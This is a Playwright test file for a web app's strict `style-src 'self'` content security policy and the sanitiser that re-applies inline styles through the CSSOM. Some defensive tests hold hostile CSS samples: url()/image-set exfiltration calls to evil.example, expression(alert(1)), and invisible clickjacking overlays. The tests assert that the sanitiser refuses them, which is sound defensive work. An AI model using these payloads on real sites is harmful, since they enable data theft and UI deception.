"""Strict `style-src 'self'` is enforced, and the app still renders.

THE LAST OPEN ITEM
──────────────────
`style-src` carried 'unsafe-inline' because the app has 4,410 inline style
attributes, of which 1,644 distinct static values are used exactly ONCE —
migrating those to utility classes does not converge, it just trades an inline
attribute for a single-use class.

WHAT MADE IT TRACTABLE
──────────────────────
style-src governs the HTML PARSER, not the CSSOM. Measured in Chromium under
`style-src 'self'`:

    <div style="color:X">                    -> BLOCKED
    el.style.color = 'X'                     -> APPLIED
    el.style.cssText = '...'                 -> APPLIED
    el.getAttribute('style')                 -> STILL RETURNS THE STRING
    <style>...</style>                       -> BLOCKED (.sheet is null)
    new CSSStyleSheet().replaceSync('...')   -> APPLIED

So the declarations survive in the DOM and can be re-applied through APIs the
policy does not govern. `frontend/js/00-style-hydrate.js` does that, filtered:
no url()/image-set, no invisible-but-clickable positioned overlays, an
allow-list of layout/typography/colour properties, nothing under
[data-untrusted].

The three inline <style> blocks (57 KB) were extracted to real stylesheets,
because a <link> to a same-origin file satisfies 'self' and needs no hydration
at all.
"""
import pytest

BASE = "http://127.0.0.1:8787"

_DISMISS = """
() => {
  for (const id of ['onboarding-overlay', 'onboarding-modal', 'welcome-banner']) {
    const el = document.getElementById(id);
    if (el) el.remove();
  }
  try { localStorage.setItem('agentic_os_onboarded', '1'); } catch (_) {}
}
"""


@pytest.fixture
def app(page):
    page.set_viewport_size({'width': 1440, 'height': 900})
    page.goto(BASE)
    page.wait_for_load_state('domcontentloaded')
    page.wait_for_function('typeof window.__delegateDispatch === "function"', timeout=15000)
    page.wait_for_timeout(1200)
    page.evaluate(_DISMISS)
    page.wait_for_timeout(200)
    return page


# ══ The policy ════════════════════════════════════════════════════════════════

def test_style_src_no_longer_allows_unsafe_inline(app):
    """The header itself. This is the item that was open."""
    resp = app.request.get(BASE + '/')
    csp = resp.headers.get('content-security-policy', '')
    style_src = next((d for d in csp.split(';') if d.strip().startswith('style-src')), '')
    assert style_src, f'no style-src in the policy: {csp}'
    assert "'unsafe-inline'" not in style_src, (
        f"style-src still permits inline styles: {style_src}"
    )
    assert style_src.strip() == "style-src 'self'"


def test_the_browser_is_actually_refusing_inline_style_attributes(app):
    """The header could be right while the browser ignores it.

    A fresh element with a style attribute must NOT have its declarations
    applied — that is what proves the policy is live rather than merely
    present.
    """
    blocked = app.evaluate("""() => {
        const probe = document.createElement('div');
        probe.setAttribute('style', 'color:rgb(1,2,3)');
        document.body.appendChild(probe);
        const refused = probe.style.length === 0;
        probe.remove();
        return refused;
    }""")
    assert blocked, (
        'the browser applied an inline style attribute, so strict style-src is '
        'not actually in force'
    )


def test_index_html_contains_no_inline_style_blocks(app):
    """`style-src 'self'` drops a <style> element whole, not per declaration.

    Three blocks totalling 57 KB held the core layout; with them inline and the
    strict policy on, Chromium dropped all three and 96,541 computed properties
    differed across 24 panes.
    """
    html = app.request.get(BASE + '/').text()
    assert '<style' not in html.lower(), 'index.html still ships an inline <style> block'


def test_the_extracted_stylesheets_are_served_and_parsed(app):
    """A <link> that 404s would be worse than the inline block it replaced."""
    sheets = app.evaluate("""() => [...document.styleSheets].map(s => {
        let n = 0;
        try { n = s.cssRules.length; } catch (e) { n = -1; }
        return { href: (s.href || 'inline').split('/').pop(), rules: n };
    })""")
    by_name = {s['href']: s['rules'] for s in sheets}
    assert 'styles-extracted.css' in by_name, f'the extracted sheet is not loaded: {by_name}'
    assert by_name['styles-extracted.css'] > 100, (
        f"the extracted sheet parsed only {by_name['styles-extracted.css']} rules"
    )


# ══ Hydration ═════════════════════════════════════════════════════════════════

def test_inline_style_attributes_are_rehydrated(app):
    """The attribute is blocked but readable, so it is re-applied via the CSSOM."""
    count = app.evaluate('() => window.__styleHydration.count()')
    assert count > 500, f'only {count} style attributes were hydrated; expected hundreds'

    unapplied = app.evaluate("""() => [...document.querySelectorAll('[style]')]
        .filter(e => e.style.length === 0 && (e.getAttribute('style') || '').trim())
        .map(e => (e.id || e.tagName) + ': ' + e.getAttribute('style').slice(0, 70))""")
    assert not unapplied, (
        'elements whose style attribute was refused and never re-applied:\n'
        + '\n'.join(unapplied[:10])
    )


def test_javascript_created_style_elements_are_adopted(app):
    """Four modules build a <style> and append it; strict style-src refuses those.

    Constructable stylesheets are not governed by style-src, so a blocked
    <style> is re-homed into an adopted sheet with identical text. Before this,
    the sidebar favourites strip, the workflow builder and the spec editor all
    lost their styling — 16,360 computed-property differences on their own.
    """
    adopted = app.evaluate('() => window.__styleHydration.sheets()')
    assert adopted >= 1, 'no JS-created <style> element was adopted'

    orphaned = app.evaluate("""() => [...document.querySelectorAll('style')]
        .filter(s => !s.sheet && !s.__adopted && (s.textContent || '').trim())
        .map(s => (s.textContent || '').slice(0, 60))""")
    assert not orphaned, 'blocked <style> elements that were never adopted:\n' + '\n'.join(orphaned)


def test_content_rendered_after_startup_is_hydrated_too(app):
    """innerHTML in a pane, a toast, a dialog — all arrive after the first pass."""
    result = app.evaluate("""async () => {
        const host = document.createElement('div');
        host.id = '__hydrate_probe';
        host.innerHTML = '<span id="__hp" style="color:rgb(3,4,5);font-size:29px">z</span>';
        document.body.appendChild(host);
        await new Promise(r => setTimeout(r, 400));
        const cs = getComputedStyle(document.getElementById('__hp'));
        const out = cs.color + '|' + cs.fontSize;
        host.remove();
        return out;
    }""")
    assert result == 'rgb(3, 4, 5)|29px', (
        f'dynamically inserted markup was not hydrated (got {result})'
    )


# ══ The sanitiser: this must not become an 'unsafe-inline' in disguise ════════

def test_the_hydrator_refuses_declarations_that_can_fetch(app):
    """CSS exfiltration is the reason style-src exists.

    `background:url(https://attacker/?leak=)` is a working channel even with
    script-src 'self'. Re-applying it would hand back exactly the capability
    the policy removes.
    """
    for css in (
        'background:url(https://evil.example/x.png)',
        'background-image:url("https://evil.example/x")',
        'background: URL( https://evil.example/x )',
        'background-image:image-set("https://evil.example/x" 1x)',
        'width:expression(alert(1))',
    ):
        out = app.evaluate('c => window.__styleHydration.sanitise(c)', css)
        assert 'evil.example' not in out and 'expression' not in out, (
            f'the hydrator would re-apply a fetching declaration: {css!r} -> {out!r}'
        )


def test_the_hydrator_refuses_invisible_clickable_overlays(app):
    """UI redress: a transparent layer over a real control.

    An honest modal has a visible backdrop, so the refusal is targeted at
    "positioned + high z-index + see-through + still catching clicks" rather
    than at positioning in general — the blunt version rejected the app's own
    modals.
    """
    attack = 'position:fixed;inset:0;z-index:99999;opacity:0.001'
    assert app.evaluate('c => window.__styleHydration.sanitise(c)', attack) == '', (
        'an invisible full-viewport overlay would be re-applied'
    )
    transparent = 'position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0)'
    assert app.evaluate('c => window.__styleHydration.sanitise(c)', transparent) == ''

    # ...while a real modal backdrop still works.
    honest = 'position:fixed;inset:0;z-index:29000;background:rgba(2,4,10,.95);display:flex'
    assert app.evaluate('c => window.__styleHydration.sanitise(c)', honest) != '', (
        'a legitimate modal backdrop is being refused'
    )
    # And a decorative overlay that cannot take clicks is fine.
    inert = 'position:fixed;inset:0;z-index:99999;opacity:0.001;pointer-events:none'
    assert app.evaluate('c => window.__styleHydration.sanitise(c)', inert) != ''


def test_the_hydrator_drops_properties_outside_the_allow_list(app):
    out = app.evaluate(
        "c => window.__styleHydration.sanitise(c)",
        'color:red;behavior:url(#x);-moz-binding:url(#y);font-size:12px')
    assert 'color:red' in out and 'font-size:12px' in out
    assert 'behavior' not in out and 'binding' not in out


def test_untrusted_subtrees_are_never_hydrated(app):
    """Agent- and user-generated markup opts out entirely."""
    hydrated = app.evaluate("""() => {
        const host = document.createElement('div');
        host.setAttribute('data-untrusted', '1');
        host.innerHTML = '<span id="__ut" style="color:rgb(7,7,7)">x</span>';
        document.body.appendChild(host);
        const el = document.getElementById('__ut');
        const applied = window.__styleHydration.hydrate(el);
        host.remove();
        return applied;
    }""")
    assert hydrated is False, 'markup inside [data-untrusted] was hydrated'


# ══ The app still works ═══════════════════════════════════════════════════════

def test_reading_back_element_style_still_drives_state(app):
    """12 sites branch on `el.style.display`.

    Hydration writes the attribute's declarations into the CSSOM, so those
    reads see the same values they always did. If it did not, every
    collapsible sidebar group, popover and drawer would stop toggling.
    """
    first = app.evaluate("""() => {
        window.toggleSidebarGroup('build');
        return getComputedStyle(document.getElementById('group-build')).display;
    }""")
    app.wait_for_timeout(250)
    second = app.evaluate("""() => {
        window.toggleSidebarGroup('build');
        return getComputedStyle(document.getElementById('group-build')).display;
    }""")
    assert first != second, (
        f'the sidebar group did not toggle ({first} -> {second}); a style read-back is broken'
    )


def test_no_enforced_csp_violation_on_any_pane(app):
    """Report-Only is expected to report; the ENFORCING policy must be clean."""
    violations = []
    app.on('console', lambda m: violations.append(m.text[:200])
           if ('Refused to' in m.text and 'Report Only' not in m.text
               and 'inline style' not in m.text) else None)

    panes = [p for p in app.evaluate(
        "() => [...document.querySelectorAll('#sidebar .nav-item')]"
        "        .map(e => e.getAttribute('data-nav'))") if p]
    for pane in panes:
        app.evaluate("p => window.nav(p)", pane)
        app.wait_for_timeout(350)

    assert not violations, (
        'enforced CSP violations (excluding the inline-style refusals the '
        'hydrator handles):\n' + '\n'.join(violations[:10])
    )


def test_only_one_onboarding_dialog_is_shown(app):
    """Two of them used to render on top of each other.

    91-mode-switcher.js built `#onboarding-overlay` (z-index 99999) while
    24-onboarding.js showed `#onboarding-modal` (z-index 29000), and neither
    knew about the other. The visible result was the mode picker floating over
    the wizard, and the close control of whichever lost was unclickable —
    Playwright reported "#onboarding-modal intercepts pointer events".
    """
    shown = app.evaluate("""() => {
        try { localStorage.removeItem('agentic_os_onboarded'); } catch (_) {}
        return ['onboarding-modal', 'onboarding-overlay'].filter(id => {
            const el = document.getElementById(id);
            return el && getComputedStyle(el).display !== 'none';
        });
    }""")
    assert len(shown) <= 1, f'more than one onboarding dialog is visible at once: {shown}'
